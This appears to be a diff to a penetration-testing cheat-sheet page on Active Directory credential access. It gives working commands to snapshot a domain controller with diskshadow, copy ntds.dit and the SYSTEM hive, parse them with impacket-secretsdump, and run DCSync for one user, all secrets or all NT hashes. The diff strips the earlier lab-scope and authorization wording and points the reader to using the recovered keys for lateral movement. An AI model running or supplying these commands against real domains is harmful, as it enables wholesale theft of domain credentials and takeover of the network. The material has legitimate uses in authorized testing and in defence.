@@ -1,79 +1,59 @@
 # AD credential access
 
-[← Active Directory quick reference](../05-active-directory.md) · [Windows token rights](../windows/token-groups.md)
-
-This page covers the DC database and directory replication. For local SAM, LSA, LSASS, and cached material on a Windows foothold, use [Windows credential access](../windows/credential-access.md).
+DC database and replication. Local SAM / LSA / LSASS on a Windows foothold → [windows/credential-access](../windows/credential-access.md).
 
 ## DC database or replication
-
 | Path | Prerequisite |
 | --- | --- |
-| Offline NTDS analysis | A usable DC database copy and its corresponding SYSTEM boot-key material |
-| Snapshot creation | Local administrator/equivalent snapshot rights, available VSS provider, and correct volume |
-| Backup-mode copy | Present/usable backup privilege and a tool requesting backup semantics |
-| DCSync | Effective replication rights at the domain root and reachable directory-replication services |
+| Offline NTDS | DC database copy + matching SYSTEM hive |
+| Snapshot (VSS) | Local admin / snapshot rights on the DC, VSS provider, right volume |
+| Backup-mode copy | `SeBackupPrivilege` + a tool requesting backup semantics |
+| DCSync | Replication rights on the domain root + reachable DRSUAPI |
 
-SeBackupPrivilege alone does not promise permission to create a snapshot. A DC's local SAM is separate from NTDS and does not contain the entire domain. [Diskshadow prerequisites](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow).
+- `SeBackupPrivilege` alone doesn't give permission to create a snapshot. The DC's local SAM ≠ NTDS.
 
 ## Snapshot and offline analysis
-
-Example lab prerequisites: an authorized administrator context on the selected DC, NTDS located at `C:\Windows\NTDS`, an unused `X:` drive, a new `C:\Temp\LabNtds` output directory, and verified copy/cleanup access. Check actual database/system volumes rather than assume default paths. Capture current shadows and writer state before adding one:
+Check paths first (NTDS defaults to `C:\Windows\NTDS`, an unused `X:` drive is needed).
 
 ```cmd
 whoami /priv
 vssadmin list shadows
 vssadmin list writers
-mkdir C:\Temp\LabNtds
+mkdir C:\Temp\Ntds
 ```
-
-Save this complete script as `C:\Temp\LabNtds\snapshot.dsh` using an available editor. This example keeps writer participation enabled; verify writer results and database consistency before parsing:
-
+`C:\Temp\Ntds\snapshot.dsh`:
 ```text
 set context persistent
-set metadata C:\Temp\LabNtds\metadata.cab
-add volume C: alias labntds
+set metadata C:\Temp\Ntds\metadata.cab
+add volume C: alias ntds
 create
-expose %labntds% X:
+expose %ntds% X:
 ```
-
-Run it and record the newly created shadow ID, set ID, exposure, and result. Copy the actual database and matching SYSTEM hive:
-
 ```cmd
-diskshadow /s C:\Temp\LabNtds\snapshot.dsh
-robocopy /b X:\Windows\NTDS C:\Temp\LabNtds ntds.dit
-robocopy /b X:\Windows\System32\config C:\Temp\LabNtds SYSTEM
-dir C:\Temp\LabNtds\ntds.dit C:\Temp\LabNtds\SYSTEM
+diskshadow /s C:\Temp\Ntds\snapshot.dsh
+robocopy /b X:\Windows\NTDS C:\Temp\Ntds ntds.dit
+robocopy /b X:\Windows\System32\config C:\Temp\Ntds SYSTEM
+dir C:\Temp\Ntds\ntds.dit C:\Temp\Ntds\SYSTEM
 ```
-
-Check each copy: Robocopy codes below `8` are not necessarily errors, but code `0` alone does not prove a new file was copied. Use a fresh destination, inspect file size, and compare source/copy hashes where readable. A nondefault or dirty database can need consistency/recovery handling; do not claim success from the snapshot command alone. [Robocopy return values](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy).
-
-Transfer only the required analysis files through the existing authorized route. On Kali:
-
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
-
-After successful copy/required evidence retention, delete **only** the created shadow. In Diskshadow, use the recorded ID:
-
 ```text
-delete shadows id <CREATED-SHADOW-ID>
+delete shadows id <SHADOW-ID>
 exit
 ```
-
-Verify that the intended exposure is gone and unrelated shadows remain; remove only the script, metadata, copies, and output created for this exercise. `delete shadows all` is not appropriate cleanup. [Scoped shadow deletion](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/delete-shadows).
+- Robocopy codes < 8 are not errors, but `0` = nothing copied: check the file size.
+- Dirty / nondefault database may need recovery before parsing.
+- Delete only the shadow you created (run inside `diskshadow`; never `delete shadows all`).
 
 ## DCSync: inspect rights and select the account
-
-Use [PowerView domain-root ACL checks](powerview.md#dcsync-rights) to confirm Get-Changes and Get-Changes-All or equivalent effective rights, including group memberships/deny entries. Host local-admin rights do not automatically imply replication rights.
-
-For one selected lab account, let the tool prompt for the operator's password:
+Confirm Get-Changes + Get-Changes-All (or equivalent) with [PowerView domain-root ACL checks](powerview.md#dcsync-rights), incl. group memberships and deny entries. Local admin on a host ≠ replication rights.
 
 ```bash
-impacket-secretsdump -dc-ip <DC-IP> -just-dc-user labuser 'corp.example/operator@dc01.corp.example'
+impacket-secretsdump -dc-ip <DC-IP> -just-dc-user <TARGET-USER> '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
+impacket-secretsdump -dc-ip <DC-IP> -just-dc '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
+impacket-secretsdump -dc-ip <DC-IP> -just-dc-ntlm '<DOMAIN.TLD>/<USER>:<PW>@<DC-FQDN>'
 ```
-
-If full directory-secret collection is actually the intended scope, `-just-dc` is broader. Record the requested account and output type; `-just-dc-user` limits collection but does not bypass missing replication rights. [Impacket replication options](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
-
-Match recovered NT/AES keys to their account and a reachable service in [lateral movement](lateral-movement.md) or [ticket handling](tickets.md). Preserve any original ACL if a separately confirmed object-rights path granted temporary replication permission; restoring that ACL is distinct from deleting local extraction output.
-
-Sources reviewed on 2026-10-02. Snapshot creation/copy, database consistency, DCSync, and cleanup remain pending isolated-DC validation.
+- `-just-dc-user` limits output but doesn't bypass missing rights. `-just-dc` = all secrets, `-just-dc-ntlm` = NT hashes only.
+- Use recovered NT / AES keys in [lateral-movement](lateral-movement.md) or [tickets](tickets.md).
+- If an object-rights path gave you the replication ACL temporarily, restore the original ACL.
